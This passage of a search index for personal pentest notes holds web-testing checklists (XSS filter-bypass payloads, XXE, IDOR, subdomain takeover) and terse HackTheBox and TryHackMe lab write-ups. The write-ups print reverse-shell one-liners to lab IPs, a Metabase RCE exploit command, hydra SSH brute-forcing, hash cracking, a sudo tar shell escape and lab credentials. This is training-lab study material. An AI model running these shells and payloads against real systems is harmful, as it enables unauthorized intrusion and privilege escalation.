restrictions: Ensure that only allowed file types can be uploaded, and test with disallowed file types to confirm the restrictions are working.</p> </li> <li> <p>MIME type validation: Check that the MIME type of uploaded files is being validated and that the system rejects files with incorrect MIME types.</p> </li> <li> <p>Filename validation: Test that the system filters and sanitizes filenames to avoid malicious filenames (e.g., \"../\", \".htaccess\") that could lead to security vulnerabilities.</p> </li> <li> <p>Malware scanning: Scan uploaded files for malware or viruses using an up-to-date antivirus solution.</p> </li> <li> <p>Duplicate file names: Test how the system handles duplicate file names, ensuring that it doesn't overwrite existing files or create security vulnerabilities.</p> </li> <li> <p>Upload directory: Verify that the upload directory is secured and not accessible for unauthorized users.</p> </li> <li> <p>Permissions: Ensure that proper file and folder permissions are set to prevent unauthorized access, modification, or deletion of uploaded files.</p> </li> <li> <p>User authentication: Test if file uploads require proper user authentication and that unauthorized users cannot upload files.</p> </li> <li> <p>Image validation: If uploading images, test for potential vulnerabilities related to image processing libraries (e.g., buffer overflows, code injection).</p> </li> <li> <p>File content validation: Ensure that the content of the files is validated and doesn't contain malicious code or scripts.</p> </li> <li> <p>Maximum file uploads: Test the maximum number of simultaneous file uploads to ensure the system can handle the load without crashing or compromising security.</p> </li> <li> <p>Timeouts: Test the system for handling long uploads and confirm that it has appropriate timeouts in place.</p> </li> <li> <p>Rate limiting: Verify that the system has rate limiting in place to prevent abuse and denial of service (DoS) attacks.</p> </li> <li> <p>Error handling: Test the system's error handling capabilities to ensure that it doesn't leak sensitive information or create security vulnerabilities.</p> </li> <li> <p>Cross-site scripting (XSS): Test for potential XSS vulnerabilities related to file uploads, such as the inclusion of malicious scripts within file metadata.</p> </li> <li> <p>Path traversal: Test for path traversal vulnerabilities by attempting to upload files with directory traversal characters (e.g., \"../\") in the file name.</p> </li> <li> <p>SQL injection: Test for potential SQL injection vulnerabilities related to file uploads, such as manipulating metadata to include malicious SQL queries.</p> </li> <li> <p>Access control: Verify that proper access controls are in place for viewing, editing, or deleting uploaded files.</p> </li> <li> <p>Logging and monitoring: Ensure that the system logs and monitors all file upload activities for potential security threats and suspicious behavior.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#xss","title":"XSS","text":"<ul> <li> <p>Basic payload injection: Inject simple script tags or HTML tags with JavaScript event handlers into input fields or query parameters. Example: <code>&lt;script&gt;alert(10)&lt;/script&gt; or &lt;img src=x onerror=alert(1)&gt;</code>.</p> </li> <li> <p>URL encoding: Use URL-encoded payloads to bypass input filters that may block certain characters. Example: <code>%3Cscript%3Ealert(1)%3C%2Fscript%3E</code>.</p> </li> <li> <p>Hex encoding: Test with hex-encoded payloads to bypass filters that block specific characters. Example: <code>&lt;scr\\x69pt&gt;alert(1)&lt;/scr\\x69pt&gt;</code>.</p> </li> <li> <p>Case variation: Try different letter casing to bypass case-sensitive filters. Example: <code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code>.</p> </li> <li> <p>HTML entity encoding: Inject payloads with HTML entities to evade filters that remove or escape specific characters. Example: <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>.</p> </li> <li> <p>Null byte injection: Use null bytes to break out of input restrictions or bypass filters. Example: <code>&lt;scr%00ipt&gt;alert(1)&lt;/scr%00ipt&gt;</code>.</p> </li> <li> <p>Double encoding: Test with double-encoded payloads to bypass filters that only decode input once. Example: <code>%253Cscript%253Ealert(1)%253C%252Fscript%253E</code>.</p> </li> <li> <p>Attribute injection: Attempt to inject payloads within existing HTML tags by closing the current attribute and adding a new one with malicious JavaScript. Example: <code>\"&gt;&lt;img src=x onerror=alert(1)&gt;</code>.</p> </li> <li> <p>JavaScript event handlers: Inject JavaScript event handlers, such as onmouseover, onfocus, or onclick, into various HTML elements to trigger the payload.</p> </li> <li> <p>Malformed tags: Test with malformed tags to bypass filters that look for well-formed HTML. Example: <code>&lt;scrip&lt;script&gt;t&gt;alert(1)&lt;/scrip&lt;/script&gt;t&gt;</code>.</p> </li> <li> <p>Using different contexts: Test payloads in various contexts, such as HTML comments, inline JavaScript, or CSS, to bypass context-specific filters.</p> </li> <li> <p>Data URI: Inject data URI payloads to bypass certain input filters. Example: <code>&lt;iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&gt;&lt;/iframe&gt;</code>.</p> </li> <li> <p>SVG payloads: Use Scalable Vector Graphics (SVG) payloads to execute JavaScript in a different context. Example: <code>&lt;svg onload=\"alert(1)\"&gt;&lt;/svg&gt;</code>.</p> </li> <li> <p>Breaking out of JavaScript: Inject payloads that break out of existing JavaScript code and execute malicious scripts.</p> </li> <li> <p>Testing error pages: Check if error pages, such as 404 or 500, reflect user input without proper encoding, as these can be used for reflected XSS attacks.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#xxe","title":"XXE","text":"<ul> <li> <p>Basic external entity: Inject a basic external entity reference to test if the parser resolves it</p> </li> <li> <p>External parameter entity: Inject an external parameter entity to bypass input filters. </p> </li> <li> <p>Blind XXE (OOB technique): Use Out-of-Band (OOB) techniques to exfiltrate data if the response doesn't display the content of the external entity.</p> </li> <li> <p>File inclusion: Attempt to include local or remote files using the SYSTEM identifier to test for arbitrary file inclusion.</p> </li> <li> <p>Internal entity expansion: Inject an internal entity with a large number of nested entities to test for a Billion Laughs attack (a type of denial-of-service attack).</p> </li> <li> <p>Recursive entity references: Test for recursive entity expansion to identify potential denial-of-service (DoS) vulnerabilities.</p> </li> <li> <p>XML bomb: Inject a large XML file with deeply nested elements to test for XML bomb vulnerabilities, which can lead to DoS attacks.</p> </li> <li> <p>Error-based XXE: Inject malformed XML with external entity references to trigger errors that reveal sensitive information.</p> </li> <li> <p>XML encoding: Try different XML encodings (e.g., UTF-16, UTF-32) to bypass input filters that block specific characters.</p> </li> <li> <p>Use CDATA sections: Inject external entity references inside CDATA sections to bypass input filters that remove or escape specific characters.</p> </li> <li> <p>Custom entities: Create custom entities with external references to test if the XML parser resolves them.</p> </li> <li> <p>Test various content types: Test for XXE vulnerabilities in different content types that support XML, such as SOAP, XHTML, SVG, or RSS.</p> </li> <li> <p>Test XML-based file formats: Test for XXE vulnerabilities in XML-based file formats, such as Office Open XML (.docx, .pptx, .xlsx) or OpenDocument (.odt, .ods, .odp).</p> </li> <li> <p>Test different HTTP methods: Test for XXE vulnerabilities using different HTTP methods, such as POST, PUT, or PATCH, with XML payloads.</p> </li> <li> <p>Test XML-based APIs: Test for XXE vulnerabilities in XML-based APIs, such as XML-RPC or SOAP-based web services.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#idor","title":"IDOR","text":"<ul> <li> <p>Sequential IDs: Analyze sequential numeric IDs or predictable identifiers in URLs, API endpoints, or hidden form fields, and try modifying them to access unauthorized resources.</p> </li> <li> <p>User-specific data: Ensure proper authorization checks are in place for user-specific data, such as profiles, orders, or messages, by attempting to access another user's data using your authenticated session.</p> </li> <li> <p>Enumerate identifiers: Create multiple accounts with different roles (e.g., admin, user) and compare the object identifiers to identify patterns or correlations.</p> </li> <li> <p>Test file uploads: Test file upload functionality and attempt to access uploaded files by guessing or modifying their filenames.</p> </li> <li> <p>Test API endpoints: Analyze API endpoints for exposed object references and attempt to access unauthorized resources by modifying request parameters.</p> </li> <li> <p>Test hidden form fields: Examine hidden form fields for object references and modify their values to access unauthorized resources.</p> </li> <li> <p>Test JSON or XML responses: Analyze JSON or XML responses for exposed object references and attempt to access unauthorized resources by modifying request parameters.</p> </li> <li> <p>Test related features: Test related features or modules, such as password reset or email validation, for IDOR vulnerabilities by modifying request parameters.</p> </li> <li> <p>Test with different roles: Create accounts with different roles (e.g., admin, user, guest) and attempt to access unauthorized resources using different user sessions.</p> </li> <li> <p>Test with unauthenticated sessions: Test if unauthenticated users can access resources by modifying object references in URLs or API endpoints.</p> </li> <li> <p>Use web application scanners: Use automated web application scanners, such as Burp Suite or OWASP ZAP, to identify potential IDOR vulnerabilities.</p> </li> <li> <p>Analyze access logs: Review server access logs for patterns indicating unauthorized access attempts.</p> </li> <li> <p>Manipulate cookies: Manipulate cookies or session tokens to impersonate other users and attempt to access unauthorized resources.</p> </li> <li> <p>Test request methods: Test for IDOR vulnerabilities using different HTTP request methods, such as GET, POST, PUT, DELETE, or PATCH.</p> </li> <li> <p>Test with URL-encoded or base64-encoded parameters: Try URL-encoded or base64-encoded parameters to bypass input validation or access control checks.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#subdomain-takeover","title":"Subdomain Takeover","text":"<ul> <li> <p>Enumerate subdomains: Use tools like Sublist3r, Amass, or dnsrecon to discover subdomains associated with your main domain.</p> </li> <li> <p>Analyze DNS records: Check DNS records (e.g., CNAME, A, AAAA, MX) for subdomains pointing to external services or expired domains.</p> </li> <li> <p>Check HTTP responses: Examine HTTP responses for error messages or status codes that may indicate an unclaimed or expired external service.</p> </li> <li> <p>Use online services: Utilize online services such as crt.sh or Censys to gather subdomain and certificate data for your main domain.</p> </li> <li> <p>Test common third-party services: Check if subdomains are pointing to common third-party services, such as AWS S3, GitHub Pages, or Heroku, that are susceptible to subdomain takeover attacks.</p> </li> <li> <p>Test for dangling CNAME records: Look for dangling CNAME records that point to external services that have been deleted or expired.</p> </li> <li> <p>Monitor domain registration: Monitor domain registration information for expired domains that can be taken over.</p> </li> <li> <p>Use subdomain takeover tools: Utilize tools like SubOver, Subjack, or tko-subs to automatically identify subdomain takeover vulnerabilities.</p> </li> <li> <p>Check for misconfigured DNS settings: Examine DNS settings for misconfigurations that might lead to subdomain takeover vulnerabilities.</p> </li> <li> <p>Test for wildcard DNS records: Check for wildcard DNS records that might expose subdomains to takeover attacks.</p> </li> <li> <p>Check for abandoned subdomains: Look for abandoned subdomains that still point to unused external services.</p> </li> <li> <p>Test for improper redirects: Check if subdomains are improperly redirecting traffic to external services that can be taken over.</p> </li> <li> <p>Monitor domain ownership changes: Monitor domain ownership changes for potential takeover opportunities.</p> </li> <li> <p>Collaborate with third-party service providers: Work with third-party service providers to ensure proper domain configuration and prevent subdomain takeover.</p> </li> <li> <p>Regularly audit subdomain configurations: Periodically review your subdomain configurations to identify and mitigate potential subdomain takeover risks.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#wordpress-cms","title":"Wordpress CMS","text":"<ul> <li> <p>Keep WordPress updated: Regularly update the WordPress core, plugins, and themes to protect against known vulnerabilities.</p> </li> <li> <p>Test for weak passwords: Ensure strong passwords are used for all user accounts, especially for administrator accounts.</p> </li> <li> <p>Check for user enumeration: Test if usernames can be enumerated through the WordPress author archives or other means, and disable user enumeration if possible.</p> </li> <li> <p>Test for default admin username: Ensure the default \"admin\" username is not used, and replace it with a custom username.</p> </li> <li> <p>Limit login attempts: Test if login attempts are limited to prevent brute-force attacks, and install a plugin like Login LockDown or Wordfence to enable this functionality if necessary.</p> </li> <li> <p>Test for insecure file permissions: Check the permissions of your WordPress files and folders to ensure they are secure and cannot be accessed by unauthorized users.</p> </li> <li> <p>Test for XML-RPC vulnerabilities: Test for vulnerabilities related to the XML-RPC feature, such as DDoS or brute-force attacks, and disable it if not needed.</p> </li> <li> <p>Test for SQL injection vulnerabilities: Test your WordPress site for SQL injection vulnerabilities by injecting SQL payloads into input fields or URL parameters.</p> </li> <li> <p>Test for Cross-Site Scripting (XSS) vulnerabilities: Test your WordPress site for XSS vulnerabilities by injecting JavaScript payloads into input fields or URL parameters.</p> </li> <li> <p>Test for Cross-Site Request Forgery (CSRF) vulnerabilities: Test your WordPress site for CSRF vulnerabilities by attempting to perform actions without a valid CSRF token or by using another user's authenticated session.</p> </li> <li> <p>Test for vulnerable plugins: Check for known vulnerabilities in your installed plugins using tools like WPScan or by regularly monitoring vulnerability databases.</p> </li> <li> <p>Test for vulnerable themes: Check for known vulnerabilities in your installed themes using tools like WPScan or by regularly monitoring vulnerability databases.</p> </li> <li> <p>Test for insecure configurations: Check your WordPress configuration (wp-config.php) for insecure settings, such as displaying errors, and secure it by disabling features like error reporting or file editing.</p> </li> <li> <p>Check for security best practices: Ensure your site follows WordPress security best practices, such as using HTTPS, disabling directory browsing, or setting secure HTTP headers.</p> </li> <li> <p>Use a security plugin: Install a comprehensive security plugin like Wordfence, iThemes Security, or Sucuri to monitor and protect your site from various threats.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"writeup/hackthebox/machines/easy/analytics/","title":"Analytics","text":"","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/analytics/#reconnaissance","title":"Reconnaissance","text":"<ul> <li>nmap</li> <li>nano /etc/hosts (analytics.htb) (data.analytical.htb)</li> </ul>","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/analytics/#enumeration","title":"Enumeration","text":"<p>open burpsuite atau just direct ke web untuk dapatkan setup-token takde fuzzing, direct public exploit</p>","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/analytics/#exploitation","title":"Exploitation","text":"<ul> <li>metabase vulnerable (https://github.com/shamo0/CVE-2023-38646-PoC) https://github.com/securezeron/CVE-2023-38646 https://github.com/m3m0o/metabase-pre-auth-rce-poc   https://medium.com/@starlox.riju123/hackthebox-analytics-metabase-rce-bd3421cba76d </li> </ul> <p>listening - rlwrap -lnvp 1234 exploit command - <code>python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c \"bash -i &gt;&amp; /dev/tcp/10.10.16.14/1234 0&gt;&amp;1\"</code></p> <ul> <li>run linpeas</li> </ul> <p>META_PASS=An4lytics_ds20223# META_USER=metalytics</p> <p>dapat user.txt</p>","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/analytics/#privesc","title":"Privesc","text":"<ul> <li>run linpeas balik sbb dah tukar user. tadi www-data user</li> <li>check ubuntu version, kernel version</li> <li>search exploit dekat internet (https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)</li> <li>send file (tengok hacktools)</li> <li>run dapat root.txt</li> </ul>","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/codify/","title":"Codify","text":"","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/easy/codify/#recon","title":"Recon","text":"<p>nmap scan if have smb or any kind of port service. use enum4linux</p>","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/easy/codify/#enumeration","title":"Enumeration","text":"<p>see what is happen on the web. make some reading. find vm2 exploit https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/ <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.9 1234 &gt;/tmp/f</code></p>","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/easy/codify/#exploitation","title":"Exploitation","text":"<p>cari something interesting found seomthing on /var/www/contact/tickets.db joshua\\(2a\\)12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2 search dulu what type is this hash <code>hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt -w 3</code> <code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></p> <p>got user.txt</p>","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/easy/codify/#privesc","title":"Privesc","text":"<p>direct sudo -l baca script /opt/scripts/mysql-backup.sh tanya chatgpt.. try to understand and listen how it works guna pspy64 <code>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64</code></p> <p>then transfer pass.py atau password.py run got root.txt</p>","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/hard/drive/","title":"- Drive","text":""},{"location":"writeup/hackthebox/machines/hard/drive/#reconnaissance","title":"Reconnaissance","text":""},{"location":"writeup/hackthebox/machines/medium/visual/","title":"- Visual","text":""},{"location":"writeup/hackthebox/machines/medium/visual/#reconnaissance","title":"Reconnaissance","text":""},{"location":"writeup/tryhackme/machines/easy/basicpentesting/","title":"Basic Pentesting","text":"","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/basicpentesting/#recon","title":"Recon","text":"<ul> <li>nmap scanning nmap -p- --min-rate 5000 $IP nmap -sV -sC -p 22,80,139,445,8009,8080 -oN nmap/tcpscan.txt $IP</li> </ul>","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/basicpentesting/#enumeration","title":"Enumeration","text":"<p>gobuster dir -u http://$IP -w /opt/tools/SecLists/Discovery/Web-Content/big.txt enum4linux -a $IP | tee enum4linux.txt</p>","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/basicpentesting/#exploitation","title":"Exploitation","text":"<p><code>hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$IP</code> username = jan password = armando</p>","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/basicpentesting/#privesc","title":"Privesc","text":"<p><code>python3 -m http.server 80</code> transfer linpeas.sh sudo -l <code>find / -user root -perm /4000 2&gt;/dev/null</code> gtfobins pkexec then tengok balik linpeas ada /home/kay/.ssh/id_rsa cat file then try login but it ask for passphrase ssh2john id_rsa &gt; kay.txt  <code>john kay.txt --wordlist=/usr/share/wordlists/rockyou.txt</code> john --show kay.txt password = beeswax</p> <p>login and cat pass.bak</p>","tags":["enum4linux","hydra","linpeas","gtfobins","ssh-key","john"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/","title":"Bounty Hacker","text":"","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/#recon","title":"Recon","text":"<p>nmap -p- --min-rate 5000 $IP nmap -sCV -p 21,22,80 $IP</p>","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/#enumeration","title":"Enumeration","text":"<p>masuk web, godek2 try fuzzing directory. takde apa2 ftp $IP get all the file in ftp using <code>get</code> </p>","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/#exploitation","title":"Exploitation","text":"<p><code>hydra -l lin -P locks.txt ssh://$IP</code></p>","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"writeup/tryhackme/machines/easy/bountyhacker/#privesc","title":"Privesc","text":"<p>letak linpeas sudo pkexec /bin/sh xberjaya sudo -l tar gtfobins <code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></p>","tags":["ftp","gobuster","hydra","linpeas","gtfobins"]},{"location":"tags/","title":"Tags","text":"<p>Following is a list of relevant tags:</p>"},{"location":"tags/#cheatsheet","title":"cheatsheet","text":"<ul> <li>Cheatsheet</li> <li>Volatility</li> <li>Tools</li> <li>Web pentest checklist</li> </ul>"},{"location":"tags/#cve","title":"cve","text":"<ul> <li>Analytics</li> <li>Codify</li> </ul>"},{"location":"tags/#enum4linux","title":"enum4linux","text":"<ul> <li>Codify</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#ftp","title":"ftp","text":"<ul> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#gobuster","title":"gobuster","text":"<ul> <li>Analytics</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#gtfobins","title":"gtfobins","text":"<ul> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#hashcat","title":"hashcat","text":"<ul> <li>Codify</li> </ul>"},{"location":"tags/#hydra","title":"hydra","text":"<ul> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#john","title":"john","text":"<ul> <li>Codify</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#linpeas","title":"linpeas","text":"<ul> <li>Analytics</li> <li>Codify</li> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#pspy64","title":"pspy64","text":"<ul> <li>Codify</li> </ul>"},{"location":"tags/#ssh-key","title":"ssh-key","text":"<ul> <li>Basic Pentesting</li> </ul>"}]}